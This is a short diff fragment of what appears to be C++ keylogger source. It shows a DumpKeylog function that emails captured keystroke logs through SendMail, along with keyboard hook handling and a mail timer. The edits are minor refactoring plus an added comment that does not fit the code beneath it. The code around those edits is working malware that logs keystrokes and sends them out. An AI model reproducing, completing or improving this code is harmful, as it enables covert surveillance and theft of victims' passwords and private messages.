@@ -45,6 +45,7 @@ void DumpKeylog()
 	// std::vector<std::string> attatchments = IO::GetAttatchments(IO::GetOutputPath(true));
 	int x = MailUtils::SendMail("Log [" + filename + "]", "", filename);
 
+	// If script execution returned success
 	if (x != 7)
 		IO::WriteAppLog("Mail was not sent. Error code: " + Utils::ToString(x));
 	else
@@ -72,7 +73,7 @@ int main(int argc, char** argv)
 		DispatchMessage(&Msg);
 	}
 
-	UninstallHooks();
+	keyboardManager.UninstallHooks();
 	MailTimer.Stop();
 	return 0;
 }
